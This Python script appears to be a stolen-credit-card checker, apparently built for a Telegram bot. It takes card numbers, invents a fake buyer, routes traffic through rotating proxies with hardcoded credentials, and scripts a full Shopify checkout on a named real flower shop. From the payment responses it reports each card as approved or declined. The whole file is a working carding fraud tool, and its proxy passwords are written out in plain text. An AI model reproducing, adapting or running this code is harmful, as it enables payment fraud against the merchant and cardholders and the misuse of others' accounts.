import asyncio, aiohttp, sys, traceback, random, re
from faker import Faker
from aiohttp_proxy import ProxyConnector
from bs4 import BeautifulSoup

import asyncio

from asyncio import sleep
from pyrogram import Client, filters
from pyrogram.types import (
	Message,
	InlineKeyboardButton,
	InlineKeyboardMarkup
) 

async def response_sh(textoo):
	
    if 'Invalid card verification number' in textoo : return 'Approved [CCN] ✅'
    elif 'Thank you for your purchase!' in textoo :return 'Aproved ✅'
    else:return 'Declined ❌'
	

def find_between( data, first, last ):
	try:
		start = data.index( first ) + len( first )
		end = data.index( last, start )
		return data[start:end]
	except ValueError:
		return None


async def shp(text):


		try:
			
			prrox = [
				'http://qkdtrrcx-rotate:2ur8c9ajow1w@p.webshare.io:80/',
				'http://wiaevqoy-rotate:8cchty7lq6uz@p.webshare.io:80/',
				'http://ckpqqagy-rotate:tayu9gg6dos6@p.webshare.io:80/',
				'http://urfhspqv-rotate:r7n6p28puxxq@p.webshare.io:80/',
				'http://dqcnwsxr-rotate:wynsge2k4ecm@p.webshare.io:80/',
				'http://cqbxjdwf-rotate:5aj4nh5oh9g1@p.webshare.io:80/',
				'http://yixupsyx-rotate:k0890u62cf0z@p.webshare.io:80/',
				#'http://edspwabx-rotate:t2huelcmdc1y@p.webshare.io:80/',
				#'http://qwzhhbyc-rotate:y65ea6osrvyh@p.webshare.io:80/',
				#'http://tiqzsrum-rotate:4uh17rettfkw@p.webshare.io:80/',
				#'http://scoccvnt-rotate:kp30swm1lxp2@p.webshare.io:80/',
				#'http://ewrnkwjt-rotate:cb5gvs87u5mp@p.webshare.io:80/',
				#'http://sxhgrqjh-rotate:ta7pcilzgw4l@p.webshare.io:80/',
				#'http://onrgncdd-rotate:av3wnkjlyg8i@p.webshare.io:80/',
				#'http://vrxijuld-rotate:jmcidcidmd9l@p.webshare.io:80/',
				]
			
			proxys = random.choice(prrox)
			connector = ProxyConnector.from_url(proxys)
			client_timeout = aiohttp.ClientTimeout(total=10)
			
			fake = Faker()
			name = fake.first_name()
			second = fake.last_name()
			num4 = str(random.randint(1000, 9999))
			email = (name+second+num4+'@gmail.com').lower()
			
			cc0 = re.findall(r'[0-9]+', text)
			cc1 = cc0[0]
			mes1 = cc0[1]
			ano1 = cc0[2]
			cvv1 = cc0[3]
			
			if mes1 == '00' or mes1 == '0':
				mes1 = str(random.randint(1, 12))
			if len(ano1) == 2:
				ano1 = '20'+ano1
						
			if int(mes1) > 9: 
				mes1 = mes1 
			else: 
				mes1 = mes1[1:2]
			
			if len(cvv1) == 4:
				if str(cc1).startswith('3'):
					cvv1 = cvv1
					
				else:
					cvv1 = cvv1[:3]
					
			if str(cc1).startswith('3'):
				cc11 = cc1[0:4]
				cc22 = cc1[4:10]
				cc33 = cc1[10:15]
				ccr = f'{cc11} {cc22} {cc33}'
					
			else:
				cc11 = cc1[0:4]
				cc22 = cc1[4:8]
				cc33 = cc1[8:12]
				cc44 = cc1[12:16]
				ccr = f'{cc11} {cc22} {cc33} {cc44}'
			
			tarjeta = cc1+"|"+mes1+"|"+ano1+"|"+cvv1

			async with aiohttp.ClientSession() as curl:
				


				headers = {
					'authority': 'oliverflowershop.com',
					'accept': '*/*',
					'content-type': 'application/x-www-form-urlencoded',
					'origin': 'https://oliverflowershop.com',
					'referer': 'https://oliverflowershop.com/products/milk-bar-cookie-tin-prd-mbcookie',
					'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
					'x-requested-with': 'XMLHttpRequest',
				}

				data = [
					('properties[delivery_date]', '2023-06-30'),
					('properties[zip_code]', '33166'),
					('form_type', 'product'),
					('utf8', '\u2713'),
					('properties[_uniqueId]', '1683156432'),
					('properties[_uniqueId]', '1683156498'),
					('properties[shipping_method]', 'florist delivered'),
					('properties[delivery_type]', 'domestic'),
					('properties[channel]', 'florist'),
					('properties[type]', 'product'),
					('properties[pickup_time]', ''),
					('properties[pickup_time_display]', ''),
					('properties[pickup_only]', 'false'),
					('shop-timezone', 'America/New_York'),
					('id', '43234101231859'),
					]


				async with curl.post('https://oliverflowershop.com/cart/add.js',data=data) as r1:
					r1_ = await r1.text()
					#print(r1_)

			
				headers = {
					'authority': 'www.shoepalace.com',
					'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
					'content-type': 'application/x-www-form-urlencoded',
					'origin': 'https://www.shoepalace.com',
					'referer': 'https://www.shoepalace.com/products/shoe-palace-spcustom-blk-red-54-shoe-palace-sp-flat-laces-54-inches-black-red',
					'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
				}


				headers = {
					'authority': 'oliverflowershop.com',
					'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
					'content-type': 'application/x-www-form-urlencoded',
					'origin': 'https://oliverflowershop.com',
					'referer': 'https://oliverflowershop.com/cart',
					'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
				}


				data = {
				'checkout': 'Checkout'
				}


				async with curl.post('https://oliverflowershop.com/cart?step=contact_information', headers=headers, data=data) as r2:
					url = r2.url
					#print(url)


				async with curl.get(url) as r3:
					r3_ = await r3.text()
					soup = BeautifulSoup(r3_, 'html.parser')
					div_tag = soup.find('div', {'class': 'step'})
					auth_token = div_tag.find('input', {'name': 'authenticity_token'}).get('value')
					#print(auth_token)

								
							
				headers = {
					'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
					'content-type': 'application/x-www-form-urlencoded',
					'origin': 'https://oliverflowershop.com',
					'referer': 'https://oliverflowershop.com/',
					'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
				}

				data = [
					('_method', 'patch'),
					('authenticity_token', auth_token),
					('previous_step', 'contact_information'),
					('step', 'shipping_method'),
					('checkout[email]', email),
					('checkout[buyer_accepts_marketing]', '0'),
					('checkout[pick_up_in_store][selected]', 'false'),
					('checkout[id]', 'delivery-shipping'),
					('checkout[location_type]', 'Residence'),
					('checkout[location_name]', ''),
					('checkout[shipping_address][first_name]', ''),
					('checkout[shipping_address][first_name]', name),
					('checkout[shipping_address][last_name]', ''),
					('checkout[shipping_address][last_name]', second),
					('checkout[shipping_address][address1]', ''),
					('checkout[shipping_address][address1]', '8241 Northwest 66th Street'),
					('checkout[shipping_address][address2]', ''),
					('checkout[shipping_address][address2]', ''),
					('checkout[shipping_address][city]', ''),
					('checkout[shipping_address][city]', 'Miami'),
					('checkout[shipping_address][country]', ''),
					('checkout[shipping_address][country]', 'United States'),
					('checkout[shipping_address][province]', ''),
					('checkout[shipping_address][province]', 'FL'),
					('checkout[shipping_address][zip]', ''),
					('checkout[shipping_address][zip]', '33166'),
					('checkout[shipping_address][phone]', ''),
					('checkout[shipping_address][phone]', '(305) 698-'+num4),
					('checkout[remember_me]', ''),
					('checkout[remember_me]', '0'),
					('checkout[special_instructions]', ''),
					('checkout[occasion_type]', 'Birthday'),
					('checkout[gift_message]', 'hello'),
					('checkout[note]', '{"fee_breakdown":"{\\"1683156498\\":{\\"SC\\":0,\\"DC\\":0,\\"RDF\\":0},\\"total\\":{\\"SC\\":0,\\"DC\\":0,\\"RDF\\":0}}","gift_signature":"","location_type":"Residence","location_name":"","occasion_type":"Birthday","gift_message":"hello","special_instructions":""}'),
					('checkout[client_details][browser_width]', '933'),
					('checkout[client_details][browser_height]', '724'),
					('checkout[client_details][javascript_enabled]', '1'),
					('checkout[client_details][color_depth]', '24'),
					('checkout[client_details][java_enabled]', 'false'),
					('checkout[client_details][browser_tz]', '0'),
					('checkout[shipping_address][company]', ''),
					]


				async with curl.post(url, headers=headers, data=data) as r4:
					url2 = r4.url
					#print(url2)


				async with curl.get(url2) as r5:
					r5_ = await r5.text()
					soup = BeautifulSoup(r5_, 'html.parser')
					div_tag = soup.find('div', {'class': 'step'})
					auth_token2 = div_tag.find('input', {'name': 'authenticity_token'}).get('value')
					#print(auth_token2)


								
				headers = {
					'authority': 'oliverflowershop.com',
					'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
					'content-type': 'application/x-www-form-urlencoded',
					'origin': 'https://oliverflowershop.com',
					'referer': 'https://oliverflowershop.com/',
					'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
				}

				data = {
					'_method': 'patch',
					'authenticity_token': auth_token2,
					'previous_step': 'shipping_method',
					'step': 'payment_method',
					'checkout[shipping_rate][id]': 'MOL Default Provider-SD-15.00',
					'checkout[note]': '{"fee_breakdown":"{\\"1683156498\\":{\\"SC\\":0,\\"DC\\":15,\\"RDF\\":0},\\"total\\":{\\"SC\\":0,\\"DC\\":15,\\"RDF\\":0}}","gift_signature":"","location_type":"Residence","location_name":"","occasion_type":"Birthday","gift_message":"hello","special_instructions":""}',
					'checkout[client_details][browser_width]': '950',
					'checkout[client_details][browser_height]': '724',
					'checkout[client_details][javascript_enabled]': '1',
					'checkout[client_details][color_depth]': '24',
					'checkout[client_details][java_enabled]': 'false',
					'checkout[client_details][browser_tz]': '0'
					}

				async with curl.post(url, headers=headers, data=data) as r6:
					url3 = r6.url
					#print(url3)


				async with curl.get(url3) as r7:
					r7_ = await r7.text()
					soup = BeautifulSoup(r7_, 'html.parser')
					div_tag = soup.find('div', {'class': 'step'})
					auth_token3 = div_tag.find('input', {'name': 'authenticity_token'}).get('value')
					#print(auth_token3)



				headers = {
					'Accept': 'application/json',
					'Content-Type': 'application/json',
					'Origin': 'https://checkout.shopifycs.com',
					'Referer': 'https://checkout.shopifycs.com/',
					'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
				}

				json_data = {
					'credit_card': {
						'number': ccr,
						'name': f'{name} {second}',
						'month': int(mes1),
						'year': int(ano1),
						'verification_value': cvv1,
					},
					'payment_session_scope': 'oliverflowershop.com',
				}

				async with curl.post('https://deposit.us.shopifycs.com/sessions', headers=headers, json=json_data) as r8:
					r8_j = await r8.json()
					tokenid = r8_j['id']
					#print(tokenid)


				headers = {
					'authority': 'oliverflowershop.com',
					'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
					'content-type': 'application/x-www-form-urlencoded',
					'origin': 'https://oliverflowershop.com',
					'referer': 'https://oliverflowershop.com/',
					'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
				}

				data = {
					'_method': 'patch',
					'authenticity_token': auth_token3,
					'previous_step': 'payment_method',
					'step': '',
					's': tokenid,
					'checkout[payment_gateway]': '82805653747',
					'checkout[credit_card][vault]': 'false',
					'checkout[different_billing_address]': 'false',
					'checkout[total_price]': '4494',
					'complete': '1',
					'checkout[client_details][browser_width]': '933',
					'checkout[client_details][browser_height]': '724',
					'checkout[client_details][javascript_enabled]': '1',
					'checkout[client_details][color_depth]': '24',
					'checkout[client_details][java_enabled]': 'false',
					'checkout[client_details][browser_tz]': '0',
					'checkout[note]': '{"fee_breakdown":"{\\"1683156498\\":{\\"SC\\":0,\\"DC\\":15,\\"RDF\\":0},\\"total\\":{\\"SC\\":0,\\"DC\\":15,\\"RDF\\":0}}","gift_signature":"","location_type":"Residence","location_name":"","occasion_type":"Birthday","gift_message":"hello","special_instructions":""}'
					}

				async with curl.post(url, headers=headers, data=data) as r9:
					None
				
				await asyncio.sleep(4)

				async with curl.get(str(url)+'?from_processing_page=1') as r10:
					r10_ = await r10.text()
					
					if 'Your order is confirmed' in r10_ or 'Your order is confirmed' in r10_ or '<div class="webform-confirmation">' in r10_ or 'receive a confirmation email whit your order number' in r10_ or 'ending whit' in r10_:
						return 'Thank you for your purchase!'
					
					with open('sh_async.html', 'w') as f: f.write(str(r10_))
					text1 = find_between(r10_, '<p class="notice__text">','</p></div></div>')
				
					if not text1:
						reintentos +=1
					else:
						if 'There was a problem processing the payment.' in text1 or 'There was an issue processing your payment. Try again or use a different payment method' in text1:
							reintentos +=1
						else:	
							return text1


		except Exception as detalles:
			if 'ProxyError' in str(detalles):

				return 'ProxyError'
			else:
				exc_type, exc_obj, tb = sys.exc_info() 
				f_name, line_num, func_name, text11 = traceback.extract_tb(tb)[0] 
				#print(f"Error: {detalles} en la línea {line_num}, Nombre del error: {text11}")
				

"""ccs = input('ccs: ')
print(asyncio.run(shp(ccs)))"""
